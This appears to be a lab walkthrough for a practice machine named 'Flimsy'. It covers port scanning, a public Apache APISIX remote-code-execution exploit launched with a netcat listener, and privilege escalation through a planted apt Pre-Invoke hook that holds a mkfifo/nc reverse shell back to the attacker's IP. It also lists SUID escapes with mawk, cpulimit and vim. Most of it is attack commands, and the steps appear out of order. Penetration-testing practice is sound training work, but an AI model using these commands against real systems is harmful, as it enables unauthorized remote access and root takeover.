                                                                             Flimsy Walkthrough

Attacker's Machine: 192.168.45.5
Victim's Machine: 192.168.232.220
export IP=192.168.232.220
	
1. nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
2. nmap -Pn -n -sC -sV -p22,8,3306,43500 $IP --open --stats-every=5s -oN results.txt

22/tcp    open  ssh                 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http                OpenResty web app server 1.21.4.1
3306/tcp  open  mysql            MySQL (unauthorized)
9443/tcp  open  ssl/tungsten-https?
43500/tcp open  http              OpenResty web app server

Service Info: OS: Linux

Port 43500 Enumeration  <!-- nothing -->

Check the page source and server headers, Discovered APISIX 2.8 header on port 43500

searchsploit APISIX          // Apache APISIX 2.12.1 - Remote Code Execution (RCE)
nc -lnvp 4444
python3 50829.py http://192.168.232.220:43500/ 192.168.45.5 4444

Got Shell!

Privilege Escalation

cat /etc/crontab
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root apt-get update
* * * * * root /root/run.sh


The apt-get update settings can be managed in the location etc/apt/apt.conf.d.
It doesn't really matter if you decide to update an existing file or create a new file of your choosing for the command to be executed. But since most likely you won't have rights to edit the existing configuration files, you will probably need to create a new file contains a new line in which you tell that a specific script will be executing before executing the update command.

cd /etc/apt/apt.conf.d
cat new_script            
nc -lvnp 1234
apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.5 1234 >/tmp/f"};  

whoami
root
cd /root
cat proof.txt     // 2de56538e38a8637964f01fb5da2b690

id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)

/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/vim.basic
/usr/bin/newuidmap

./mawk 'BEGIN {system("/bin/sh")}'          <!-- aparently it only get's the bash for the same user-->
./cpulimit -l 100 -f -- /bin/sh -p 
whoami
root
cd /root
cat local.txt

We already got a SUID on gtfobins with VIM.
Just make sure you change the name and which python is being executed, in our case python3

/usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
